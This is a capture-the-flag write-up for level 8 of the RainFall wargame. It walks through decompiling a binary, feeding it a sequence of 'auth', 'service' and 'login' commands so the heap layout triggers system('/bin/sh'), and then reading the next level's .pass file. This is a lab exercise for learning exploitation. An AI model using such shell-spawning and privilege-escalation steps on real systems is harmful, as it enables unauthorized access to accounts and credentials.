## Flag8 README: Finding Flag8

After connection on our vm with:
```bash
ssh level8@localhost -p 4242
```

We found a binary named level8. When we run it we obtain:
```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
```

Okay next step, decompile this program in order to understand what's the purpose and how to exploit it.

As you can see in our file [source](../source), program just printing adress of buffer auth and buffer service.
We can see on line 28 `system("/bin/sh")`, okay you find our target. If we manage to write into `auth + 8` then the program will run `/bin/sh`

Okay we have our plan but how can we manage to do so ?

So we simply tried the command `'auth '` which gave us:

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
```

Okay ...

This is the adress of our buffer `auth`. Okay let's try command `service` then:

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
```

service's adress is auth's adress + 16...
okay we need to add 16 again so let's just recall service and see what happen's:

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service 
0x804a008, 0x804a028 
```
Okay now let's try to run command `login`

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service 
0x804a008, 0x804a028 
login
$ 
```

And VOILA, our shell is runing with level9, as always we just need to **cat** the file **.pass** of level9.